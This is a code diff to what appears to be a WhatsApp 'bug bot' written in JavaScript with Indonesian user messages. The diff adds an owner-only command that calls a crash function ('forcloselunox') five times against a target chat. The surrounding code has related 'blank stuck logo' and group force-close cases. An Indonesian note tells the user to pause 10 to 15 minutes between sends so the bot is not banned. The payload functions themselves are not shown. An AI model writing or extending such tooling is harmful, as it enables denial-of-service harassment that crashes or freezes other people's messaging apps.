@@ -2603,7 +2603,31 @@ await blankhardlunox(target);
 console.log(chalk.red.bold("🩸success mengirim bug dengan jenis : blank stuck logo"))
             }
             break;            
-                                                      
+
+//CASE BUG IN PLACE
+case 'p': {
+await reaction(m.chat, "⏳")
+if (!isOwner) return reply(config.message.owner); 
+let target = m.chat;
+
+reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴! 𝘚𝘦𝘯𝘵 𝘵𝘰 ${target}\n\n𝙉𝙤𝙩𝙚 : 𝘎𝘶𝘯𝘢𝘬𝘢𝘯 𝘑𝘦𝘥𝘢 𝘚𝘦𝘵𝘦𝘭𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮, 𝘈𝘨𝘢𝘳 𝘉𝘰𝘵 𝘛𝘪𝘥𝘢𝘬 𝘔𝘶𝘥𝘢𝘩 𝘒𝘦𝘯𝘰𝘯, 𝘔𝘪𝘯𝘪𝘮𝘢𝘭 𝘑𝘦𝘥𝘢 10/15 𝘔𝘦𝘯𝘪𝘵!!`);
+for (let i = 0; i < 5; i++) {
+ try {
+   await forcloselunox(target);
+   
+   } catch (err) {
+                
+     console.log("Error:", err.message);
+     break;
+
+   }
+     
+}
+
+console.log(chalk.red.bold(`🩸success mengirim bug ke ${target}`))
+            }
+            break;
+				
 //CASE BUG GRUP FC           		
 case 'combo-gb': {
     await reaction(m.chat, "🕛")
